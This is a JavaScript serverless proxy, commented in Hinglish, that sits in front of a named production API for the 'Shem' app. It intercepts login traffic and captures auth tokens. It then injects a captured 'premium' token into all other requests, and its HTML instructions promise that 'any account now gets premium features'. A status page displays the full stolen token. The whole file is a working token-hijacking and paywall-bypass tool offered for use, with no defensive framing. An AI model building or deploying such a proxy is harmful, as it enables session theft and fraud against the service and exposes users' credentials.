import { createHash } from 'crypto';

// ============================================================
// TOKEN INJECTION PROXY - Automatic Token Capture & Inject
// ============================================================

let CAPTURED_TOKEN = null; // Global token storage
let TOKEN_TIMESTAMP = null;

export default async function handler(req, res) {
    const urlPath = req.url;
    const method = req.method;
    const targetBaseUrl = "https://prod.api.shem.apisaranyu.in";

    // ============================================================
    // PART 1: TOKEN CAPTURE PAGE (Agar /capture-token call ho)
    // ============================================================
    if (urlPath === '/capture-token') {
        if (method === 'POST') {
            try {
                const body = JSON.parse(req.body || '{}');
                
                // Token capture karo (different field names check)
                const token = body.token || 
                              body.accessToken || 
                              body.auth_token ||
                              body.authToken ||
                              body.jwt ||
                              body.data?.token;

                if (token) {
                    CAPTURED_TOKEN = token;
                    TOKEN_TIMESTAMP = new Date().toISOString();
                    
                    return res.status(200).json({
                        status: "success",
                        message: "Token captured successfully!",
                        token_preview: token.substring(0, 50) + "...",
                        captured_at: TOKEN_TIMESTAMP
                    });
                } else {
                    return res.status(400).json({
                        status: "error",
                        message: "No token found in request",
                        received_body: body
                    });
                }
            } catch (error) {
                return res.status(500).json({
                    status: "error",
                    message: "Error capturing token: " + error.message
                });
            }
        }
        
        // GET - Show capture page
        if (method === 'GET') {
            return res.status(200).setHeader('Content-Type', 'text/html').end(TOKEN_CAPTURE_HTML);
        }
    }

    // ============================================================
    // PART 2: TOKEN STATUS PAGE (Captured token dekhne ke liye)
    // ============================================================
    if (urlPath === '/token-status') {
        return res.status(200).setHeader('Content-Type', 'text/html').end(TOKEN_STATUS_HTML(CAPTURED_TOKEN, TOKEN_TIMESTAMP));
    }

    // ============================================================
    // PART 3: TOKEN RESET (Naya token capture karne ke liye)
    // ============================================================
    if (urlPath === '/reset-token') {
        CAPTURED_TOKEN = null;
        TOKEN_TIMESTAMP = null;
        return res.status(200).json({
            status: "success",
            message: "Token cleared. Ready to capture new token."
        });
    }

    // ============================================================
    // PART 4: LOGIN INTERCEPTION & TOKEN CAPTURE
    // ============================================================
    if (urlPath.includes('/login') || urlPath.includes('/auth')) {
        try {
            const targetUrl = targetBaseUrl + urlPath;
            
            const headers = { ...req.headers };
            headers['host'] = 'prod.api.shem.apisaranyu.in';
            delete headers['accept-encoding'];
            delete headers['content-length'];
            headers['accept'] = 'application/json';
            headers['content-type'] = 'application/json';

            const fetchOptions = {
                method: method,
                headers: headers,
            };

            if (method !== 'GET' && req.body) {
                fetchOptions.body = typeof req.body === 'string' ? req.body : JSON.stringify(req.body);
            }

            const response = await fetch(targetUrl, fetchOptions);
            let data = await response.json();

            // 🔥 TOKEN AUTO-CAPTURE: Login response se token nikalo
            const responseToken = data.token || 
                                 data.accessToken ||
                                 data.auth_token ||
                                 data.authToken ||
                                 data.data?.token ||
                                 data.data?.accessToken;

            if (responseToken && method === 'POST') {
                CAPTURED_TOKEN = responseToken;
                TOKEN_TIMESTAMP = new Date().toISOString();
                console.log("✅ Token auto-captured from login response!");
            }

            return res.status(response.status).json(data);
        } catch (error) {
            return res.status(500).json({
                code: 500,
                message: "Login Error: " + error.message
            });
        }
    }

    // ============================================================
    // PART 5: INJECT CAPTURED TOKEN IN ALL REQUESTS
    // ============================================================
    try {
        const targetUrl = targetBaseUrl + urlPath;
        
        const headers = { ...req.headers };
        headers['host'] = 'prod.api.shem.apisaranyu.in';
        delete headers['accept-encoding'];
        delete headers['content-length'];
        headers['accept'] = 'application/json';
        headers['content-type'] = 'application/json';

        // 🔥 INJECT CAPTURED TOKEN - YE MAIN PART HAI!
        if (CAPTURED_TOKEN) {
            // Different header types ko try karo
            headers['authorization'] = `Bearer ${CAPTURED_TOKEN}`;
            headers['Authorization'] = `Bearer ${CAPTURED_TOKEN}`;
            headers['x-auth-token'] = CAPTURED_TOKEN;
            headers['X-Auth-Token'] = CAPTURED_TOKEN;
            headers['token'] = CAPTURED_TOKEN;
        }

        // Timestamp refresh
        headers['ts'] = Math.floor(Date.now() / 1000).toString();

        const fetchOptions = {
            method: method,
            headers: headers,
        };

        if (method !== 'GET' && method !== 'HEAD' && req.body) {
            fetchOptions.body = typeof req.body === 'string' ? req.body : JSON.stringify(req.body);
        }

        const response = await fetch(targetUrl, fetchOptions);
        const contentType = response.headers.get('content-type') || '';

        res.setHeader('Content-Type', 'application/json; charset=UTF-8');

        if (contentType.includes('application/json')) {
            let data = await response.json();
            return res.status(response.status).json(data);
        } else {
            const arrayBuffer = await response.arrayBuffer();
            const buffer = Buffer.from(arrayBuffer);
            
            response.headers.forEach((value, key) => {
                if (key !== 'content-encoding' && key !== 'content-length') {
                    res.setHeader(key, value);
                }
            });
            return res.status(response.status).send(buffer);
        }

    } catch (error) {
        return res.status(500).json({
            code: 500,
            message: "Proxy Error: " + error.message,
            error_details: error.toString()
        });
    }
}

// ============================================================
// TOKEN CAPTURE PAGE - HTML UI
// ============================================================
const TOKEN_CAPTURE_HTML = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔑 Premium Token Capture</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 500px;
            width: 100%;
            padding: 40px;
            text-align: center;
        }
        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 28px;
        }
        .subtitle {
            color: #666;
            margin-bottom: 30px;
            font-size: 14px;
        }
        .steps {
            background: #f8f9fa;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 30px;
            text-align: left;
        }
        .step {
            display: flex;
            margin-bottom: 15px;
            align-items: flex-start;
        }
        .step:last-child { margin-bottom: 0; }
        .step-number {
            background: #667eea;
            color: white;
            width: 30px;
            height: 30px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            margin-right: 15px;
            flex-shrink: 0;
        }
        .step-text {
            color: #333;
            font-size: 14px;
            line-height: 1.5;
        }
        .button-group {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }
        button {
            flex: 1;
            padding: 12px 20px;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }
        .btn-primary {
            background: #667eea;
            color: white;
        }
        .btn-primary:hover {
            background: #5568d3;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }
        .btn-secondary {
            background: #e9ecef;
            color: #333;
        }
        .btn-secondary:hover {
            background: #dee2e6;
        }
        .status-box {
            background: #e7f3ff;
            border: 2px solid #667eea;
            border-radius: 8px;
            padding: 15px;
            margin-top: 20px;
            text-align: left;
        }
        .status-label {
            color: #667eea;
            font-weight: 600;
            font-size: 12px;
            text-transform: uppercase;
            margin-bottom: 5px;
        }
        .status-value {
            color: #333;
            font-size: 13px;
            word-break: break-all;
            font-family: monospace;
            background: white;
            padding: 8px;
            border-radius: 4px;
            margin-top: 5px;
        }
        .info-box {
            background: #fff3cd;
            border-left: 4px solid #ffc107;
            padding: 15px;
            border-radius: 4px;
            margin-top: 20px;
            text-align: left;
            font-size: 13px;
            color: #856404;
        }
        .success { color: #28a745; font-weight: 600; }
        .error { color: #dc3545; font-weight: 600; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔑 Premium Token Capture</h1>
        <p class="subtitle">Automatic Token Injection System</p>
        
        <div class="steps">
            <div class="step">
                <div class="step-number">1</div>
                <div class="step-text">
                    <strong>Go to Shem App</strong><br>
                    Use the original app and login with any account
                </div>
            </div>
            <div class="step">
                <div class="step-number">2</div>
                <div class="step-text">
                    <strong>Change Proxy Settings</strong><br>
                    Configure app to use this proxy instead of direct API
                </div>
            </div>
            <div class="step">
                <div class="step-number">3</div>
                <div class="step-text">
                    <strong>Token Auto-Captured</strong><br>
                    System automatically captures your premium token
                </div>
            </div>
            <div class="step">
                <div class="step-number">4</div>
                <div class="step-text">
                    <strong>All Requests Use Premium</strong><br>
                    Any account now gets premium features! 🚀
                </div>
            </div>
        </div>

        <div class="button-group">
            <button class="btn-primary" onclick="checkTokenStatus()">📊 Check Status</button>
            <button class="btn-secondary" onclick="resetToken()">🔄 Reset Token</button>
        </div>

        <div id="status" class="status-box" style="display:none;">
            <div class="status-label">Current Token Status</div>
            <div id="status-text" class="status-value"></div>
        </div>

        <div class="info-box">
            <strong>⚙️ Proxy Setup:</strong><br>
            Replace: https://prod.api.shem.apisaranyu.in<br>
            With: https://your-proxy-domain.com<br>
            (Update in your app's API configuration)
        </div>
    </div>

    <script>
        async function checkTokenStatus() {
            try {
                const response = await fetch('/token-status');
                const html = await response.text();
                window.open(window.URL.createObjectURL(new Blob([html], { type: 'text/html' })));
            } catch (error) {
                alert('Error: ' + error.message);
            }
        }

        async function resetToken() {
            if (confirm('Are you sure? This will clear the captured token.')) {
                try {
                    const response = await fetch('/reset-token');
                    const data = await response.json();
                    alert(data.message);
                    location.reload();
                } catch (error) {
                    alert('Error: ' + error.message);
                }
            }
        }
    </script>
</body>
</html>
`;

// ============================================================
// TOKEN STATUS PAGE - Display Current Token
// ============================================================
function TOKEN_STATUS_HTML(token, timestamp) {
    const tokenPreview = token ? token.substring(0, 100) + "..." : "No token captured";
    const status = token ? `<span class="success">✅ ACTIVE</span>` : `<span class="error">❌ NOT CAPTURED</span>`;

    return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Token Status</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 15px;
            padding: 40px;
            max-width: 600px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        h1 { color: #333; margin-bottom: 30px; }
        .info-box {
            background: #f8f9fa;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
        }
        .info-label {
            color: #667eea;
            font-weight: 600;
            font-size: 12px;
            text-transform: uppercase;
            margin-bottom: 8px;
        }
        .info-value {
            color: #333;
            font-size: 14px;
            word-break: break-all;
            font-family: monospace;
            background: white;
            padding: 12px;
            border-radius: 4px;
        }
        .success { color: #28a745; font-weight: 600; }
        .error { color: #dc3545; font-weight: 600; }
        .button {
            background: #667eea;
            color: white;
            padding: 12px 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            width: 100%;
            margin-top: 20px;
        }
        .button:hover {
            background: #5568d3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📊 Token Status Dashboard</h1>
        
        <div class="info-box">
            <div class="info-label">Status</div>
            <div class="info-value">${status}</div>
        </div>

        ${token ? `
        <div class="info-box">
            <div class="info-label">Token (Full)</div>
            <div class="info-value">${token}</div>
        </div>

        <div class="info-box">
            <div class="info-label">Captured At</div>
            <div class="info-value">${timestamp || 'Unknown'}</div>
        </div>

        <div class="info-box">
            <div class="info-label">Token Length</div>
            <div class="info-value">${token.length} characters</div>
        </div>
        ` : '<p style="color: #dc3545; margin: 20px 0;"><strong>No token captured yet!</strong><br>Login through the proxy first.</p>'}

        <button class="button" onclick="history.back()">← Go Back</button>
    </div>
</body>
</html>
    `;
}
